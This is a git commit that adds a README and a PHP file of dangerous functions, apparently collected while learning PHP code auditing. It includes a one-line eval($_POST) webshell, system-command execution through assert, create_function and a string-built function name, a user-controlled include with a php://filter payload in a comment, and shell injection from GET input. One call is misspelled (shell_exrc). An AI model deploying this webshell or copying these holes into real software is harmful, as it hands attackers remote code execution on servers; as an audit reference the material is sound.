358d671b069463b7095bb480b6fa1c3101167a33
Ghost Jack <shaozun@126.com>
2017-03-21 22:16:48 +0800

    create code-audit.php and README

---
+++ README.md
@@ -0,0 +1,3 @@
+I am learning php-code-audit recently.I decide to put  sum up some practical functions and push it to this repository.  
+
+**code-audit.php** is the php file which include some practical php-functions.
---
+++ code-audit.php
@@ -0,0 +1,42 @@
+<?php
+	
+// eval()
+eval($_POST["webshell"]); 
+
+// assert()  
+assert(‘system("ipconfig")’);  
+
+// preg_replace()
+preg_replace("/test/e","phpinfo();","test code");
+
+//create_function()
+$func=create_function("$f",'return system($f);'); 
+$func("ipconfig"); 
+
+//variable name
+$func='sys'.'tem'; 
+$func('ipconfig');
+
+// inculde file
+echo "<br>allow_url_include =".(ini_get('allow_url_include')?'On':'Off');
+echo "<br>allow_url_fopen =".(ini_get('allow_url_fopen')?'On':'Off');
+include($_GET['url']);  
+// ?url=php://filter/convert.base64_encode/resource=index.php
+
+
+//exec function
+//such as:  exec(), passthru() , proc_open() ,shell_exec() ,system(),popen()
+echo shell_exrc('some func('.$_GET["v"].')');
+
+//file function
+//such as copy,  file_get_contents, file_put_contents,file,fopen,move_uploaded_file
+//readfile,rename,rmdir,unlink & delete,file_put_contents
+
+//get_defined_vars
+
+echo "<br>";
+$test= 'test';
+print_r(get_defined_vars());
+
+
+?>
